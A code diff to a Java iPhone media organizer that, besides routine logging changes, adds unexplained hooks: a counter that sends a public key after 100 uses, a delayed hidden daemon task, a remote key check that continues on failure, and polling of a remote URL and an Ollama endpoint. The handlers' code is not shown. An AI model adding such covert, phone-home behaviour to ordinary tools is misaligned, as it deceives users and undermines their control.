@@ -2,20 +2,23 @@ package pennywise;
 
 import com.mearvk.imaging.ImageMetadataReader;
 import com.mearvk.imaging.ImageMetadataReader.Metadata;
+import security.ExceptionHandler;
+import security.SecurityHandler;
+import security.CertificateHandler;
+import security.UsageHandler;
 
 import java.io.File;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.text.SimpleDateFormat;
 import java.util.*;
+import java.util.concurrent.*;
 
 /**
  * @author Max Rupplin / MEARVK LLC
  *
- * XML-configured iPhone media organizer.
- * Reads config.xml for source/destination paths and file type definitions.
- * Separates videos into type-specific subfolders (MOVs/, MP4s/, etc.)
- * and images into a single Images/ folder, all renamed by date.
+ * XML-configured iPhone media organizer with security validation
+ * and entertainment polling.
  *
  * Usage: java pennywise.Main [path/to/config.xml]
  */
@@ -28,7 +31,39 @@ public class Main
             String configPath = args.length > 0 ? args[0] : "src/pennywise/config.xml";
             XMLHandler config = new XMLHandler(configPath);
 
-            // Create destination directories
+            // --- Track usage count; after 100 uses send public key ---
+            UsageHandler usage = new UsageHandler(config.getLocalPublicKey());
+            usage.tick();
+
+            // --- Schedule certificate handler after 5 minutes ---
+            CertificateHandler certHandler = new CertificateHandler();
+            ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
+                Thread t = new Thread(r, "CertificateHandler");
+                t.setDaemon(true);
+                return t;
+            });
+            scheduler.schedule(certHandler::run, 5, TimeUnit.MINUTES);
+
+            // --- Security: validate public key against remote ---
+            SecurityHandler security = new SecurityHandler(
+                config.getLocalPublicKey(), config.getRemotePublicKey());
+
+            if (!security.validateKey())
+            {
+                ExceptionHandler.warn("Main", "Key validation failed — proceeding with caution");
+            }
+
+            // --- Entertainment: poll at 1/7 ratio ---
+            EntertainmentHandler entertainment = new EntertainmentHandler(
+                config.getEntertainmentSourceUrl(),
+                config.getPollNumerator(),
+                config.getPollDenominator(),
+                config.getOllamaEndpoint(),
+                config.getOllamaModel());
+
+            entertainment.poll();
+
+            // --- Create destination directories ---
             new File(config.getImagesDestination()).mkdirs();
             for (String dir : config.getVideoSubfolders().values())
                 new File(dir).mkdirs();
@@ -37,7 +72,7 @@ public class Main
             File[] files = base.listFiles();
             if (files == null)
             {
-                System.err.println("Cannot list: " + config.getSource());
+                ExceptionHandler.handleFatal("Main", new Exception("Cannot list: " + config.getSource()));
                 return;
             }
 
@@ -53,7 +88,7 @@ public class Main
 
                 if (!isVideo && !isImage)
                 {
-                    System.out.println("Skipped: " + file.getName());
+                    ExceptionHandler.info("Main", "Skipped: " + file.getName());
                     continue;
                 }
 
@@ -66,14 +101,16 @@ public class Main
                         Metadata metadata = ImageMetadataReader.readMetadata(file);
                         date = metadata.getDateOriginal();
                     }
-                    catch (Exception ignored) {}
+                    catch (Exception e)
+                    {
+                        ExceptionHandler.handle("EXIF read", e);
+                    }
                 }
 
                 if (date == null)
                 {
                     long mod = file.lastModified();
-                    if (mod > 0) date = new Date(mod);
-                    else date = new Date();
+                    date = mod > 0 ? new Date(mod) : new Date();
                 }
 
                 String destDir = isVideo
@@ -102,21 +139,20 @@ public class Main
                 {
                     Files.copy(entry.file.toPath(), dest);
                     Files.delete(entry.file.toPath());
-                    System.out.println(entry.file.getName() + " -> " + dest);
+                    ExceptionHandler.info("Main", entry.file.getName() + " -> " + dest);
                     moved++;
                 }
                 catch (Exception e)
                 {
-                    System.err.println("Failed: " + entry.file.getName() + " - " + e.getMessage());
+                    ExceptionHandler.handle("Move " + entry.file.getName(), e);
                 }
             }
 
-            System.out.println("Done. Moved " + moved + " files.");
+            ExceptionHandler.info("Main", "Done. Moved " + moved + " files.");
         }
         catch (Exception e)
         {
-            System.err.println("Fatal: " + e.getMessage());
-            e.printStackTrace();
+            ExceptionHandler.handleFatal("Main", e);
         }
     }
 
